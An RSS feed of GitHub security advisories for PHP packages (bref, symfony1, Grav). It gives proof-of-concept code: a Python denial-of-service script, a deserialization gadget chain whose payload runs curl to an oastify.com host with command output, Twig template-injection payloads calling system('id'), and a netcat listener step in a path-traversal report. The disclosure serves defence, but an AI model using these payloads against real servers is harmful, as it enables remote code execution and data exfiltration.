<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/composer.rss</id>
    <title>Security Advisory for PHP packages hosted at packagist.org</title>
    <updated>2024-03-22T20:01:19.613Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Acomposer"/>
    <subtitle>Security Advisory for PHP packages hosted at packagist.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[bref/bref] Slow String Operations via MultiPart Requests in Event-Driven Functions]]></title>
        <id>https://github.com/advisories/GHSA-j4hq-f63x-f39r</id>
        <link href="https://github.com/advisories/GHSA-j4hq-f63x-f39r"/>
        <updated>2024-03-22T16:57:42.000Z</updated>
        <content type="html"><![CDATA[<h2 id="impacted-resources">Impacted Resources</h2>
<p>bref/src/Event/Http/Psr7Bridge.php:94-125
multipart-parser/src/StreamedPart.php:383-418</p>
<h2 id="description">Description</h2>
<p>When Bref is used with the Event-Driven Function runtime and the handler is a <code>RequestHandlerInterface</code>, then the Lambda event is converted to a PSR7 object.
During the conversion process, if the request is a MultiPart, each part is parsed. In the parsing process, the <code>Content-Type</code> header of each part is read using the <a href="https://github.com/Riverline/multipart-parser/"><code>Riverline/multipart-parser</code></a> library.</p>
<p>The library, in the <code>StreamedPart::parseHeaderContent</code> function, performs slow multi-byte string operations on the header value.
Precisely, the <a href="https://www.php.net/manual/en/function.mb-convert-encoding.php"><code>mb_convert_encoding</code></a> function is used with the first (<code>$string</code>) and third (<code>$from_encoding</code>) parameters read from the header value.</p>
<h2 id="impact">Impact</h2>
<p>An attacker could send specifically crafted requests which would force the server into performing long operations with a consequent long billed duration.</p>
<p>The attack has the following requirements and limitations:</p>
<ul>
<li>The Lambda should use the Event-Driven Function runtime.</li>
<li>The Lambda should use the <code>RequestHandlerInterface</code> handler.</li>
<li>The Lambda should implement at least an endpoint accepting POST requests.</li>
<li>The attacker can send requests up to 6MB long (this is enough to cause a billed duration between 400ms and 500ms with the default 1024MB RAM Lambda image of Bref).</li>
<li>If the Lambda uses a PHP runtime &lt;= php-82 the impact is higher as the billed duration in the default 1024MB RAM Lambda image of Bref could be brought to more than 900ms for each request.</li>
</ul>
<p>Notice that the vulnerability applies only to headers read from the request body as the request header has a limitation which allows a total maximum size of ~10KB.</p>
<h2 id="poc">PoC</h2>
<ol>
<li>Create a new Bref project.</li>
<li>Create an <code>index.php</code> file with the following content:</li>
</ol>
<pre><code class="language-php">&lt;?php

namespace App;

require __DIR__ . '/vendor/autoload.php';

use Nyholm\Psr7\Response;
use Psr\Http\Message\ResponseInterface;
use Psr\Http\Message\ServerRequestInterface;
use Psr\Http\Server\RequestHandlerInterface;

class MyHttpHandler implements RequestHandlerInterface
{
    public function handle(ServerRequestInterface $request): ResponseInterface
    {
        return new Response(200, [], "OK");
    }
}

return new MyHttpHandler();
</code></pre>
<ol start="3">
<li>Use the following <code>serverless.yml</code> to deploy the Lambda:</li>
</ol>
<pre><code class="language-yaml">service: app

provider:
    name: aws
    region: eu-central-1

plugins:
    - ./vendor/bref/bref

# Exclude files from deployment
package:
    patterns:
        - '!node_modules/**'
        - '!tests/**'

functions:
    api:
        handler: index.php
        runtime: php-83
        events:
            - httpApi: 'ANY /endpoint'
</code></pre>
<ol start="4">
<li>Run the following python script with as first argument the domain assigned to the Lambda (e.g. <code>python3 poc.py a10avtqg5c.execute-api.eu-central-1.amazonaws.com</code>):</li>
</ol>
<pre><code class="language-python">from requests import post
from sys import argv

if len(argv) != 2:
    print(f"Usage: {argv[0]} &lt;domain&gt;")
    exit()

url = f"https://{argv[1]}/endpoint"
headers = {"Content-Type": "multipart/form-data; boundary=a"}
data_normal = f"--a\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\nContent-Type: ;*=auto''{('a'*(4717792))}'\r\n--a--\r\n"
data_malicious = f"--a\r\nContent-Disposition: form-data; name=\"0\"\r\nContent-Type: ;*=auto''{('a'*(4717792))}'\r\n\r\n\r\n--a--\r\n"

print("[+] Sending normal request")
post(url, headers=headers, data=data_normal)

print("[+] Sending malicious request")
post(url, headers=headers, data=data_malicious)
</code></pre>
<ol start="5">
<li>Observe the CloudWatch logs of the Lambda and notice that the first requests used less than 200ms of billed duration, while the second one, which has a malicious <code>Content-Type</code> header, used more than 400ms of billed duration.</li>
</ol>
<h2 id="suggested-remediation">Suggested Remediation</h2>
<p>Perform an additional validation on the headers parsed via the <code>StreamedPart::parseHeaderContent</code> function to allow only legitimate headers with a reasonable length.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/brefphp/bref/security/advisories/GHSA-j4hq-f63x-f39r">https://github.com/brefphp/bref/security/advisories/GHSA-j4hq-f63x-f39r</a></li>
<li><a href="https://github.com/brefphp/bref/commit/5f7c0294628dbcec6305f638ff7e2dba8a1c2f45">https://github.com/brefphp/bref/commit/5f7c0294628dbcec6305f638ff7e2dba8a1c2f45</a></li>
<li><a href="https://github.com/advisories/GHSA-j4hq-f63x-f39r">https://github.com/advisories/GHSA-j4hq-f63x-f39r</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j4hq-f63x-f39r</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-22T16:57:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[friendsofsymfony1/symfony1]  Gadget chain in Symfony 1 due to uncontrolled unserialized input in sfNamespacedParameterHolder]]></title>
        <id>https://github.com/advisories/GHSA-pv9j-c53q-h433</id>
        <link href="https://github.com/advisories/GHSA-pv9j-c53q-h433"/>
        <updated>2024-03-22T16:56:22.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Symfony 1 has a gadget chain due to dangerous unserialize in <code>sfNamespacedParameterHolder</code> class that would enable an attacker to get remote code execution if a developer unserialize user input in his project.</p>
<h3 id="details">Details</h3>
<p>This vulnerability present no direct threat but is a vector that will enable remote code execution if a developper deserialize user untrusted data. For example:</p>
<pre><code class="language-php"> public function executeIndex(sfWebRequest $request)
  {
    $a = unserialize($request-&gt;getParameter('user'));
  }
</code></pre>
<p>We will make the assumption this is the case in the rest of this explanation.</p>
<p>Symfony 1 provides the class <code>sfNamespacedParameterHolder</code> which implements <code>Serializable</code> interface. In particular, when an instance of this class is deserialized, the normal php behavior is hooked by implementing <code>unserialize()</code> method:</p>
<pre><code class="language-php">    public function unserialize($serialized)
    {
        $this-&gt;__unserialize(unserialize($serialized));
    }
</code></pre>
<p>Which make an array access on the deserialized data without control on the type of the <code>$data</code> parameter:</p>
<pre><code class="language-php">    public function __unserialize($data)
    {
        $this-&gt;default_namespace = $data[0];
        $this-&gt;parameters = $data[1];
    }
</code></pre>
<p>Thus, an attacker provide any object type in <code>$data</code> to make PHP access to another array/object properties than intended by the developer. In particular, it is possible to abuse the array access which is triggered on <code>$data[0]</code> for any class implementing <code>ArrayAccess</code>  interface. <code>sfOutputEscaperArrayDecorator</code>  implements such interface. Here is the call made on <code>offsetGet()</code>:</p>
<pre><code class="language-php">  public function offsetGet($offset)
    {
        $value = isset($this-&gt;value[$offset]) ? $this-&gt;value[$offset] : null;

        return sfOutputEscaper::escape($this-&gt;escapingMethod, $value);
    }
</code></pre>
<p>Which trigger <code>escape()</code> in <code>sfOutputEscaper</code> class with attacker controlled parameters from deserialized object with <code>$this-&gt;escapingMethod</code> and <code>$this-&gt;value[$offset]</code>:</p>
<pre><code class="language-php">  public static function escape($escapingMethod, $value)
  {
    if (null === $value)
    {
      return $value;
    }

    // Scalars are anything other than arrays, objects and resources.
    if (is_scalar($value))
    {
      return call_user_func($escapingMethod, $value);
    }
</code></pre>
<p>Which calls <code>call_user_func</code> with previous attacker controlled input.</p>
<h3 id="poc">PoC</h3>
<p>So we need the following object to trigger an OS command like <code>shell_exec("curl https://7v3fcazcqt9v0dowwmef4aph48azyqtei.oastify.com?a=$(id)");</code>:</p>
<pre><code class="language-php">object(sfNamespacedParameterHolder)#4 (1) {
  ["prop":protected]=&gt;
  object(sfOutputEscaperArrayDecorator)#3 (2) {
    ["value":protected]=&gt;
    array(1) {
      [0]=&gt;
      string(66) "curl https://7v3fcazcqt9v0dowwmef4aph48azyqtei.oastify.com?a=$(id)"
    }
    ["escapingMethod":protected]=&gt;
    string(10) "shell_exec"
  }
}
</code></pre>
<p>We craft a chain with PHPGGC. Please do not publish it as I will make a PR on PHPGGC but I wait for you to fix before:</p>
<ul>
<li>gadgets.php:</li>
</ul>
<pre><code class="language-php">class sfOutputEscaperArrayDecorator
{
  protected $value;

  protected $escapingMethod;

  public function __construct($escapingMethod, $value) {
    $this-&gt;escapingMethod = $escapingMethod;
    $this-&gt;value = $value;
  }
}

class sfNamespacedParameterHolder implements Serializable 
{
    protected $prop = null;

    public function __construct($prop) {
      $this-&gt;prop = $prop;
    }

    public function serialize()
    {
        return serialize($this-&gt;prop);
    }

    public function unserialize($serialized)
    {
        
    }
}
</code></pre>
<ul>
<li>chain.php:</li>
</ul>
<pre><code class="language-php">namespace GadgetChain\Symfony;

class RCE16 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.1.0 &lt;= 1.5.18';
    public static $vector = 'Serializable';
    public static $author = 'darkpills';
    public static $information = '';

    public function generate(array $parameters)
    {
        $escaper = new \sfOutputEscaperArrayDecorator($parameters['function'], array($parameters['parameter']));

        $tableInfo = new \sfNamespacedParameterHolder($escaper);
        
        return $tableInfo;
    }
}
</code></pre>
<p>And trigger the deserialization with an HTTP request like the following on a dummy test controller:</p>
<pre><code class="language-http">POST /frontend_dev.php/test/index HTTP/1.1
Host: localhost:8001
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 532

user=C%3A27%3A%22sfNamespacedParameterHolder%22%3A183%3A%7BO%3A29%3A%22sfOutputEscaperArrayDecorator%22%3A2%3A%7Bs%3A8%3A%22%00%2A%00value%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A66%3A%22curl+https%3A%2F%2F7v3fcazcqt9v0dowwmef4aph48azyqtei.oastify.com%3Fa%3D%24%28id%29%22%3B%7Ds%3A17%3A%22%00%2A%00escapingMethod%22%3Bs%3A10%3A%22shell_exec%22%3B%7D%7D
</code></pre>
<p>Note that CVSS score is not applicable to this kind of vulnerability.</p>
<h3 id="impact">Impact</h3>
<p>The attacker can execute any PHP command which leads to remote code execution.</p>
<h3 id="recommendation">Recommendation</h3>
<p>I recommend to add a type checking before doing any processing on the unserialized input like this example:</p>
<pre><code class="language-php">public function unserialize($data)
{
    if (is_array($data)) {
      $this-&gt;default_namespace = $data[0];
      $this-&gt;parameters = $data[1];
    } else {
      $this-&gt;default_namespace = null;
      $this-&gt;parameters = array();

      // or throw an exception maybe?
    }
}
</code></pre>
<p>This fix should be applied in both <code>sfNamespacedParameterHolder</code> and <code>sfParameterHolder</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/FriendsOfSymfony1/symfony1/security/advisories/GHSA-pv9j-c53q-h433">https://github.com/FriendsOfSymfony1/symfony1/security/advisories/GHSA-pv9j-c53q-h433</a></li>
<li><a href="https://github.com/advisories/GHSA-pv9j-c53q-h433">https://github.com/advisories/GHSA-pv9j-c53q-h433</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pv9j-c53q-h433</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-03-22T16:56:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[getgrav/grav] Server Side Template Injection (SSTI) via Twig escape handler]]></title>
        <id>https://github.com/advisories/GHSA-2m7x-c7px-hp58</id>
        <link href="https://github.com/advisories/GHSA-2m7x-c7px-hp58"/>
        <updated>2024-03-22T16:56:06.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Due to the unrestricted access to twig extension class from grav context, an attacker can redefine the escape function and execute arbitrary commands.</p>
<h3 id="details">Details</h3>
<p><a href="https://github.com/twigphp/Twig/blob/3.x/src/Extension/EscaperExtension.php#L99">https://github.com/twigphp/Twig/blob/3.x/src/Extension/EscaperExtension.php#L99</a></p>
<pre><code class="language-php">/**
     * Defines a new escaper to be used via the escape filter.
     *
     * @param string   $strategy The strategy name that should be used as a strategy in the escape call
     * @param callable $callable A valid PHP callable
     */
    public function setEscaper($strategy, callable $callable)
    {
        $this-&gt;escapers[$strategy] = $callable;
    }
</code></pre>
<p> Twig supports the functionality to redefine the escape function through the setEscaper method. 
However, that method is not originally exposed to the twig environment, but it is accessible through the payload below.</p>
<pre><code class="language-plaintext">{{ grav.twig.twig.extensions.core.setEscaper('a','a') }}
</code></pre>
<p>At this point, it accepts callable type as an argument, but as there is no validation for the $callable variable, attackers can set dangerous functions like system as the escaper function.</p>
<h3 id="poc">PoC</h3>
<pre><code>{{ var_dump(grav.twig.twig.extensions.core.setEscaper('system','twig_array_filter')) }}
{{ var_dump(['id'] | escape('system', 'system')) }}
</code></pre>
<h3 id="impact">Impact</h3>
<p>Twig processing of static pages can be enabled in the front matter by any administrative user allowed to create or edit pages.
As the Twig processor runs unsandboxed, this behavior can be used to gain arbitrary code execution and elevate privileges on the instance.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/getgrav/grav/security/advisories/GHSA-2m7x-c7px-hp58">https://github.com/getgrav/grav/security/advisories/GHSA-2m7x-c7px-hp58</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28119">https://nvd.nist.gov/vuln/detail/CVE-2024-28119</a></li>
<li><a href="https://github.com/getgrav/grav/commit/de1ccfa12dbcbf526104d68c1a6bc202a98698fe">https://github.com/getgrav/grav/commit/de1ccfa12dbcbf526104d68c1a6bc202a98698fe</a></li>
<li><a href="https://github.com/twigphp/Twig/blob/3.x/src/Extension/EscaperExtension.php#L99">https://github.com/twigphp/Twig/blob/3.x/src/Extension/EscaperExtension.php#L99</a></li>
<li><a href="https://github.com/advisories/GHSA-2m7x-c7px-hp58">https://github.com/advisories/GHSA-2m7x-c7px-hp58</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2m7x-c7px-hp58</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-22T16:56:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[getgrav/grav] Server Side Template Injection (SSTI)]]></title>
        <id>https://github.com/advisories/GHSA-r6vw-8v8r-pmp4</id>
        <link href="https://github.com/advisories/GHSA-r6vw-8v8r-pmp4"/>
        <updated>2024-03-22T16:55:41.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Due to the unrestricted access to twig extension class from grav context, an attacker can redefine config variable. As a result, attacker can bypass previous patch.</p>
<h3 id="details">Details</h3>
<p>The twig context has a function declared called getFunction.</p>
<pre><code class="language-php">public function getFunction($name)
    {
        if (!$this-&gt;extensionInitialized) {
            $this-&gt;initExtensions();
        }

        if (isset($this-&gt;functions[$name])) {
            return $this-&gt;functions[$name];
        }

        foreach ($this-&gt;functions as $pattern =&gt; $function) {
            $pattern = str_replace('\\*', '(.*?)', preg_quote($pattern, '#'), $count);

            if ($count) {
                if (preg_match('#^'.$pattern.'$#', $name, $matches)) {
                    array_shift($matches);
                    $function-&gt;setArguments($matches);

                    return $function;
                }
            }
        }

        foreach ($this-&gt;functionCallbacks as $callback) {
            if (false !== $function = \call_user_func($callback, $name)) {
                return $function;
            }
        }

        return false;
    }
</code></pre>
<p>This function, if the value of <code>$name</code> does not exist in <code>$this-&gt;functions</code>, uses call_user_func to execute callback functions stored in <code>$this-&gt;functionCallbacks</code>.</p>
<p>It is possible to register arbitrary function using registerUndefinedFunctionCallback, but a callback that has already been registered exists and new callbacks added will not be executed.</p>
<p>The default function callback is as follows:</p>
<pre><code class="language-php">$this-&gt;twig-&gt;registerUndefinedFunctionCallback(function (string $name) use ($config) {
                $allowed = $config-&gt;get('system.twig.safe_functions');
                if (is_array($allowed) and in_array($name, $allowed, true) and function_exists($name)) {
                    return new TwigFunction($name, $name);
                }
                if ($config-&gt;get('system.twig.undefined_functions')) {
                    if (function_exists($name)) {
                        if (!Utils::isDangerousFunction($name)) {
                            user_error("PHP function {$name}() was used as Twig function. This is deprecated in Grav 1.7. Please add it to system configuration: `system.twig.safe_functions`", E_USER_DEPRECATED);

                            return new TwigFunction($name, $name);
                        }

                        /** @var Debugger $debugger */
                        $debugger = $this-&gt;grav['debugger'];
                        $debugger-&gt;addException(new RuntimeException("Blocked potentially dangerous PHP function {$name}() being used as Twig function. If you really want to use it, please add it to system configuration: `system.twig.safe_functions`"));
                    }

                    return new TwigFunction($name, static function () {});
                }

                return false;
            });
</code></pre>
<p>If you look at this function, if the value of system.twig.undefined_functions is false, it returns false.
In that case, it is possible for our registered callback to be executed.</p>
<p>At this time, the <code>Grav\Common\Config\Config</code> class is loaded within the grav context, and access to the set method is allowed, making it possible to set the value of system.twig.undefined_functions to false.
As a result, an attacker can execute any arbitrarily registered callback function.</p>
<h3 id="poc">PoC</h3>
<pre><code>{{ grav.twig.twig.registerUndefinedFunctionCallback('system') }}
{% set a = grav.config.set('system.twig.undefined_functions',false) %}
{{ grav.twig.twig.getFunction('id') }}
</code></pre>
<p><img alt="image" src="https://user-images.githubusercontent.com/46442697/281371295-25174479-e9ab-40ca-8016-99c51f72d7a8.png"></p>
<h3 id="impact">Impact</h3>
<p>Twig processing of static pages can be enabled in the front matter by any administrative user allowed to create or edit pages.
As the Twig processor runs unsandboxed, this behavior can be used to gain arbitrary code execution and elevate privileges on the instance.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/getgrav/grav/security/advisories/GHSA-r6vw-8v8r-pmp4">https://github.com/getgrav/grav/security/advisories/GHSA-r6vw-8v8r-pmp4</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28118">https://nvd.nist.gov/vuln/detail/CVE-2024-28118</a></li>
<li><a href="https://github.com/getgrav/grav/commit/de1ccfa12dbcbf526104d68c1a6bc202a98698fe">https://github.com/getgrav/grav/commit/de1ccfa12dbcbf526104d68c1a6bc202a98698fe</a></li>
<li><a href="https://github.com/advisories/GHSA-r6vw-8v8r-pmp4">https://github.com/advisories/GHSA-r6vw-8v8r-pmp4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r6vw-8v8r-pmp4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-22T16:55:39.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[getgrav/grav] Server Side Template Injection (SSTI)]]></title>
        <id>https://github.com/advisories/GHSA-qfv4-q44r-g7rv</id>
        <link href="https://github.com/advisories/GHSA-qfv4-q44r-g7rv"/>
        <updated>2024-03-22T16:35:51.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Grav validates accessible functions through the Utils::isDangerousFunction function, but does not impose restrictions on twig functions like twig_array_map, allowing attackers to bypass the validation and execute arbitrary commands.</p>
<h3 id="details">Details</h3>
<pre><code>{{ grav.twig.twig.getFunction('twig_array_map')|var_dump }}
</code></pre>
<p><img alt="image" src="https://user-images.githubusercontent.com/46442697/281397674-6098806a-e936-4849-956e-d394a7c037da.png"></p>
<p>When we accessed twig_array_map like this, we confirmed that the twigFunction object is properly returned. Since the callable property is correctly included, we can access twig_array_map without any restrictions.</p>
<pre><code>{% set cmd = {'id':'system'} %}
{{ twig_array_map(grav.twig.twig,cmd,'call_user_func')|join }}
</code></pre>
<p>Since there is no validation on twig_array_map itself, it is possible to call arbitrary function using call_user_func.</p>
<h3 id="poc">PoC</h3>
<pre><code>{% set cmd = {'id':'system'} %}
{{ twig_array_map(grav.twig.twig,cmd,'call_user_func')|join }}
</code></pre>
<h3 id="impact">Impact</h3>
<p>Twig processing of static pages can be enabled in the front matter by any administrative user allowed to create or edit pages.
As the Twig processor runs unsandboxed, this behavior can be used to gain arbitrary code execution and elevate privileges on the instance.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/getgrav/grav/security/advisories/GHSA-qfv4-q44r-g7rv">https://github.com/getgrav/grav/security/advisories/GHSA-qfv4-q44r-g7rv</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28117">https://nvd.nist.gov/vuln/detail/CVE-2024-28117</a></li>
<li><a href="https://github.com/getgrav/grav/commit/de1ccfa12dbcbf526104d68c1a6bc202a98698fe">https://github.com/getgrav/grav/commit/de1ccfa12dbcbf526104d68c1a6bc202a98698fe</a></li>
<li><a href="https://github.com/advisories/GHSA-qfv4-q44r-g7rv">https://github.com/advisories/GHSA-qfv4-q44r-g7rv</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qfv4-q44r-g7rv</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-22T16:35:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[getgrav/grav] Server-Side Template Injection (SSTI) with Grav CMS security sandbox bypass]]></title>
        <id>https://github.com/advisories/GHSA-c9gp-64c4-2rrh</id>
        <link href="https://github.com/advisories/GHSA-c9gp-64c4-2rrh"/>
        <updated>2024-03-22T16:30:29.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Grav CMS is vulnerable to a Server-Side Template Injection (SSTI), which allows any authenticated user (editor permissions are sufficient) to execute arbitrary code on the remote server bypassing the existing security sandbox.</p>
<h3 id="details">Details</h3>
<p>The Grav CMS implements a custom sandbox to protect the powerful Twig methods "registerUndefinedFunctionCallback()" and "registerUndefinedFilterCallback()", in order to avoid SSTI attacks by denying the calling of dangerous PHP functions into the Twig template directives (such as: "exec()", "passthru()", "system()", etc.). 
The current defenses are based on a blacklist of prohibited functions (PHP, Twig), checked through the "isDangerousFunction()" method called in the file "system/src/Grav/Common/Twig.php":</p>
<pre><code class="language-php">...
$this-&gt;twig = new TwigEnvironment($loader_chain, $params);

$this-&gt;twig-&gt;registerUndefinedFunctionCallback(function (string $name) use ($config) {
    $allowed = $config-&gt;get('system.twig.safe_functions');
    if (is_array($allowed) &amp;&amp; in_array($name, $allowed, true) &amp;&amp; function_exists($name)) {
        return new TwigFunction($name, $name);
    }
    if ($config-&gt;get('system.twig.undefined_functions')) {
        if (function_exists($name)) {
            if (!Utils::isDangerousFunction($name)) {
                user_error("PHP function {$name}() was used as Twig function. This is deprecated in Grav 1.7. Please add it to system configuration: `system.twig.safe_functions`", E_USER_DEPRECATED);

                return new TwigFunction($name, $name);
            }

           /** @var Debugger $debugger */
           $debugger = $this-&gt;grav['debugger'];
           $debugger-&gt;addException(new RuntimeException("Blocked potentially dangerous PHP function {$name}() being used as Twig function. If you really want to use it, please add it to system configuration: `system.twig.safe_functions`"));
        }

        return new TwigFunction($name, static function () {});
    }

    return false;
});

$this-&gt;twig-&gt;registerUndefinedFilterCallback(function (string $name) use ($config) {
    $allowed = $config-&gt;get('system.twig.safe_filters');
    if (is_array($allowed) &amp;&amp; in_array($name, $allowed, true) &amp;&amp; function_exists($name)) {
        return new TwigFilter($name, $name);
    }
    if ($config-&gt;get('system.twig.undefined_filters')) {
        if (function_exists($name)) {
            if (!Utils::isDangerousFunction($name)) {
                user_error("PHP function {$name}() used as Twig filter. This is deprecated in Grav 1.7. Please add it to system configuration: `system.twig.safe_filters`", E_USER_DEPRECATED);
                return new TwigFilter($name, $name);
            }
...
</code></pre>
<p>In the code above it can be seen that the calls of the "isDangerousFunction()" are not performed when the method/filter in the "$name" variable has been considered safe. A function can be defined safe only by an administrator user, by adding it into the configuration properties "system.twig.safe_functions" and/or "system.twig.safe_filters" (a sort of whitelists that by default are empty) of the configuration file "system/config/system.yaml".</p>
<p>It is to note that within the "system/src/Grav/Common/Twig.php" file a Twig class is defined (with its constructor, methods and attributes) and in particular the Twig object (and environment) is instantiated on it:</p>
<pre><code class="language-php">/**
 * Class Twig
 * @package Grav\Common\Twig
 */
class Twig
{
    /** @var Environment */
    public $twig;
    /** @var array */
    public $twig_vars = [];
    /** @var array */
    public $twig_paths;
    /** @var string */
    public $template;
...
   /**
     * Constructor
     *
     * @param Grav $grav
     */
    public function __construct(Grav $grav)
    {
        $this-&gt;grav = $grav;
        $this-&gt;twig_paths = [];
    }

    /**
     * Twig initialization that sets the twig loader chain, then the environment, then extensions
     * and also the base set of twig vars
     *
     * @return $this
     */
    public function init()
    {
        if (null === $this-&gt;twig) {
            /** @var Config $config */
            $config = $this-&gt;grav['config'];
...
</code></pre>
<p>Since the security sandbox does not protect the Twig object it is possible to interact with it (e.g. call its methods, read/write its attributes) through opportunely crafted Twig template directives injected on a web page. 
Then an authenticated editor user could be able to add arbitrary functions into the Twig attributes "system.twig.safe_functions" and "system.twig.safe_filters" in order to circumvent the Grav CMS sandbox.</p>
<h3 id="poc">PoC</h3>
<p>An authenticated user with the permissions to edit a page (having Twig processing enabled) on the Grav CMS admin console, could create/edit a web page containing a malicious template directive to execute arbitrary OS commands on the remote web server.
For instance, in order to abuse the vulnerability and execute the prohibited "system('id')" code, bypassing the sandbox, the editor could generate a web page containing the following template directives:</p>
<pre><code>{% set arr = {'1':'system', '2':'foo'} %}
{{ var_dump(grav.twig.twig_vars['config'].set('system.twig.safe_functions', arr)) }}
{{ system('id') }}
</code></pre>
<p>Once saved the malicious page could be accessed by unauthenticated users to execute the "system('id')" code on the remote server hosting the vulnerable Grav CMS.</p>
<h3 id="impact">Impact</h3>
<p>It is possible to execute remote code on the underlying server and compromise it.</p>
<h3 id="tested-version">Tested version</h3>
<p>Grav CMS v1.7.43</p>
<h3 id="reported-by">Reported by</h3>
<p>Maurizio Siddu</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/getgrav/grav/security/advisories/GHSA-c9gp-64c4-2rrh">https://github.com/getgrav/grav/security/advisories/GHSA-c9gp-64c4-2rrh</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28116">https://nvd.nist.gov/vuln/detail/CVE-2024-28116</a></li>
<li><a href="https://github.com/getgrav/grav/commit/4149c81339274130742831422de2685f298f3a6e">https://github.com/getgrav/grav/commit/4149c81339274130742831422de2685f298f3a6e</a></li>
<li><a href="https://github.com/advisories/GHSA-c9gp-64c4-2rrh">https://github.com/advisories/GHSA-c9gp-64c4-2rrh</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c9gp-64c4-2rrh</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-03-22T16:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[getgrav/grav] File Upload Path Traversal]]></title>
        <id>https://github.com/advisories/GHSA-m7hx-hw6h-mqmc</id>
        <link href="https://github.com/advisories/GHSA-m7hx-hw6h-mqmc"/>
        <updated>2024-03-22T16:29:58.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p><em>A file upload path traversal vulnerability has been identified in the application, enabling attackers to replace or create files with extensions like .json, .zip, .css, .gif, etc. This security flaw poses severe risks, that can allow attackers to inject arbitrary code on the server, undermine integrity of backup files by overwriting existing files or creating new ones, and exfiltrate sensitive data using CSS exfiltration techniques.</em></p>
<h3 id="installation-configuration">Installation Configuration</h3>
<ul>
<li>Grav CMS 1.10.44</li>
<li>Apache web server</li>
<li>php-8.2</li>
</ul>
<h3 id="details">Details</h3>
<p><em><strong>Vulnerable code location:</strong></em> grav/system/src/Grav/Common/Media/Traits/MediaUploadTrait.php/checkFileMetadata() method_</p>
<pre><code>public function checkFileMetadata(array $metadata, string $filename = null, array $settings = null): string
{
    // Add the defaults to the settings.
    $settings = $this-&gt;getUploadSettings($settings);

    // Destination is always needed (but it can be set in defaults).
    $self = $settings['self'] ?? false;
    if (!isset($settings['destination']) &amp;&amp; $self === false) {
        throw new RuntimeException($this-&gt;translate('PLUGIN_ADMIN.DESTINATION_NOT_SPECIFIED'), 400);
    }

    if (null === $filename) {
        // If no filename is given, use the filename from the uploaded file (path is not allowed). 
        $folder = '';
        $filename = $metadata['filename'] ?? '';
    } else {
        // If caller sets the filename, we will accept any custom path.
        $folder = dirname($filename);
        if ($folder === '.') {
            $folder = '';
        }
        $filename = Utils::basename($filename);
</code></pre>
<h3 id="poc">PoC</h3>
<ol>
<li>Log in to the Grav CMS using a super administrator account.</li>
<li>Add a user in the "Accounts" section with the following permissions:</li>
</ol>
<ul>
<li>Login to Admin</li>
<li>Page Update</li>
</ul>
<ol start="3">
<li>Log out of the super administrator account and log in with the previously created user account.</li>
<li>Navigate to the https://admin/pages/home.</li>
<li>Use the following command in Kali Linux to open a netcat listener:</li>
</ol>
<pre><code>nc -lvnp 8081
</code></pre>
<p><img alt="image" src="https://user-images.githubusercontent.com/48800246/296318900-cc257c4f-e67e-45af-a2a1-1ee5d7e6d165.png">
